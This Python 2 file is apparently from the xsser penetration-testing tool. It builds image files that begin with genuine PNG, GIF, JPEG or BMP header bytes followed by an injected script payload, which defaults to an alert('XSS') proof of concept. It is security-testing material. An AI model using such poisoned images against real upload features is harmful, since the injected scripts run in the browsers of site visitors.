#!/usr/bin/env python
# -*- coding: utf-8 -*-"
# vim: set expandtab tabstop=4 shiftwidth=4:
"""
$Id$

This file is part of the xsser project, http://xsser.03c8.net

Copyright (c) 2011/2016 psy <epsylon@riseup.net>

xsser is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 3 of the License.

xsser is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with xsser; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import os

class ImageInjections(object):
    
    def __init__(self, payload =''):
        self._payload = payload

    def image_xss(self, filename, payload):
        """
        Create -fake- image with code XSS injected.
        """
        # check user image name input valid extensions
        root, ext = os.path.splitext(filename)
        
	# create file and inject code
        if ext.lower() in [".png", ".jpg", ".gif", ".bmp"]:
            f = open(filename, 'wb')
						                
            # check user payload input
            user_payload = payload
            if not user_payload:
                user_payload = "<script>alert('XSS')</script>"
	
            # inject each XSS specific code     
            if ext.lower() == ".png":
                content = '‰PNG' + user_payload
            elif ext.lower() == ".gif":
                content = 'GIF89a' + user_payload
            elif ext.lower() == ".jpg":
                content = 'ÿØÿà JFIF' + user_payload
            elif ext.lower() == ".bmp":
                content = 'BMFÖ' + user_payload

            # write and close
            f.write(content)
            f.close()

            image_results = "\nCode: "+ content + "\nFile: ", root + ext
        else:
            image_results = "\nPlease select a supported extension = .PNG, .GIF, .JPG or .BMP"
        return image_results

if __name__ == '__main__':
    image_xss_injection = ImageInjections('')
    print image_xss_injection.image_xss('ImageXSSpoison.png' , "<script>alert('XSS')</script>")
